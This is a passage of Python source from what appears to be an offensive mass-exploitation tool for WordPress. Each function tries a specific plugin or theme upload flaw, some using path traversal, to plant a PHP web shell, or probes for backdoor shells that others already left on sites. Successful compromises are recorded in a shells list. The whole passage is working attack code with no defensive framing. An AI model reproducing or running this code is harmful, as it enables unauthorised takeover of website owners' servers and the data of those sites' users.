            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X22(url):
    try:
        files = {'et_pb_contact_file': open('files/TitaniumEx.php', 'rb')}
        urlx = url +"/wp-content/plugins/divi-contact-extended/includes/upload.php"
        upload_dir = url +"/wp-content/plugins/gatewayapi/inc/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headers,files=files,verify=False,timeout=5)
        hs = re.findall('"file_uri":"(.*?)"', xex)[0]
        d = hs.replace('\\', '')
        if 'TitaniumEx' in xex.content:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(d+"\n")
            (d)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X23(url):
    try:
        data = {'': ('TitaniumExV1.php', shell)}
        urlx = url +"/wp-admin/admin-ajax.php?action=wps_membership_csv_file_upload"
        upload_dir = url +"/wp-content/uploads/mfw-activity-logger/csv-uploads/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,data=data,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X24(url):
    try:
        upload_dir = url +"/index.php?3x=3x"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if '<title>Upload files' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]".replace("/index.php?3x=3x/",""))
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X25(url):
    try:
        upload_dir = url +"/wp-admin/css/colors/blue/uploader.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="submit" value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X26(url):
    try:
        data = {
                    'Edit': 'contact',
                    'fnmae': '../../TitaniumEx.php',
                    'content': shell
        }
        urlx = url +"/wp-content/plugins/contact-form-7/admin/edit-contact-form.php"
        upload_dir = url +"/wp-content/plugins/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headers,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X27(url):
    try:
        data = {'file': ('TitaniumEx.php', shell)}
        urlx = url +"/wp-admin/admin-ajax.php?action=p3dlite_handle_upload"
        upload_dir = url +"/wp-content/uploads/p3d/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headers,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X28(url):
    try:
        upload_dir = url +"/index.php?x=ooo"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="submit" value="up"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X29(url):
    try:
        upload_dir = url +"/wp-content/index.php?x=ooo"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="submit" value="up"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X30(url):
    try:
        data = {'mode':'upload', 'uploadpath':'/wp-content/themes/greyd_suite/inc/TitaniumEx/', 'name_full':'TitaniumEx'}
        files = {'file': open('files/TitaniumEx.zip', 'rb')}
        urlx = url +"/wp-content/themes/greyd_suite/inc/customizer_ff.php"
        upload_dir = url +"/wp-content/themes/greyd_suite/inc/TitaniumEx/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headers,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X31(url):
    try:
        shellname = "TitaniumEx.php"
        headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                                        'Content-Type':'multipart/form-data; boundary=---------------------------12506695537580437361896332570'}
        data = '-----------------------------12506695537580437361896332570\r\n'
        data += 'Content-Disposition: form-data; name="file"; filename="{}"\r\n'.format(shellname)
        data += 'Content-Type: text/plain\r\n'
        data += '\r\n'
        data += '{}\r\n'.format(shell)
        data += '-----------------------------12506695537580437361896332570\r\n'
        data += 'Content-Disposition: form-data; name="_upl"\r\n'
        data += '\r\n'
        data += 'Upload\r\n'
        data += '-----------------------------12506695537580437361896332570--\r\n'
        data = data.encode("utf-8")
        files = {'file': open('files/TitaniumEx.zip', 'rb')}
        urlx = url +"/wp-content/themes/seotheme/db.php?u"
        upload_dir = url +"/wp-content/themes/seotheme/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headersup,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in str(xe.text):
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X32(url):
    try:
        shellname = "TitaniumEx.php"
        headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                                        'Content-Type':'multipart/form-data; boundary=---------------------------12506695537580437361896332570'}
        data = '-----------------------------12506695537580437361896332570\r\n'
        data += 'Content-Disposition: form-data; name="file"; filename="{}"\r\n'.format(shellname)
        data += 'Content-Type: text/plain\r\n'
        data += '\r\n'
        data += '{}\r\n'.format(shell)
        data += '-----------------------------12506695537580437361896332570\r\n'
        data += 'Content-Disposition: form-data; name="_upl"\r\n'
        data += '\r\n'
        data += 'Upload\r\n'
        data += '-----------------------------12506695537580437361896332570--\r\n'
        data = data.encode("utf-8")
        files = {'file': open('files/TitaniumEx.zip', 'rb')}
        urlx = url +"/wp-content/themes/seoplugins/db.php?u"
        upload_dir = url +"/wp-content/themes/seoplugins/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headersup,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in str(xe.text):
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X33(url):
    try:
        shellname = "TitaniumEx.php"
        headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                                        'Content-Type':'multipart/form-data; boundary=---------------------------12506695537580437361896332570'}
        data = '-----------------------------12506695537580437361896332570\r\n'
        data += 'Content-Disposition: form-data; name="file"; filename="{}"\r\n'.format(shellname)
        data += 'Content-Type: text/plain\r\n'
        data += '\r\n'
        data += '{}\r\n'.format(shell)
        data += '-----------------------------12506695537580437361896332570\r\n'
        data += 'Content-Disposition: form-data; name="_upl"\r\n'
        data += '\r\n'
        data += 'Upload\r\n'
        data += '-----------------------------12506695537580437361896332570--\r\n'
        data = data.encode("utf-8")
        files = {'file': open('files/TitaniumEx.zip', 'rb')}
        urlx = url +"/wp-content/themes/linpreview/db.php?u"
        upload_dir = url +"/wp-content/themes/linpreview/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headersup,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in str(xe.text):
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X34(url):
    try:
        shellname = "TitaniumEx.php"
        headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                                        'Content-Type':'multipart/form-data; boundary=---------------------------12506695537580437361896332570'}
        data = '-----------------------------12506695537580437361896332570\r\n'
        data += 'Content-Disposition: form-data; name="file"; filename="{}"\r\n'.format(shellname)
        data += 'Content-Type: text/plain\r\n'
        data += '\r\n'
        data += '{}\r\n'.format(shell)
        data += '-----------------------------12506695537580437361896332570\r\n'
        data += 'Content-Disposition: form-data; name="_upl"\r\n'
        data += '\r\n'
        data += 'Upload\r\n'
        data += '-----------------------------12506695537580437361896332570--\r\n'
        data = data.encode("utf-8")
        files = {'file': open('files/TitaniumEx.zip', 'rb')}
        urlx = url +"/wp-content/themes/pridmag/db.php?u"
        upload_dir = url +"/wp-content/themes/pridmag/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headersup,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in str(xe.text):
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X35(url):
    try:
        upload_dir = url +"/wp-content/plugins/background-image-cropper/ups.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'type="submit" id="_upl" value="Upload' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X36(url):
    try:
        upload_dir = url +"/wp-content/plugins/wordpress3cll/up.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="file" name="btul"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X37(url):
    try:
        upload_dir = url +"/wp-content/themes/wp-pridmag/init.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="submit" value="Up' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X38(url):
    try:
        upload_dir = url +"/wp-content/plugins/w0rdpr3ssnew/wp-login.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="file" name="f[]" class="custom-file-input"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X39(url):
    try:
        upload_dir = url +"/0byte.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="file" name="file"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X40(url):
    try:
        upload_dir = url +"/wp-content/wso112233.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="submit" value="Up' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X41(url):
    try:
        upload_dir = url +"/wso112233.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="file" name="f[]" class="custom-file-input"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X42(url):
    try:
        upload_dir = url +"/wp-admin/css/colors/blue/uploader.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'type="submit" value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X43(url):
    try:
        upload_dir = url +"/wp-content/themes/ccx/index.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'Negat1ve Shell' in xe.text:
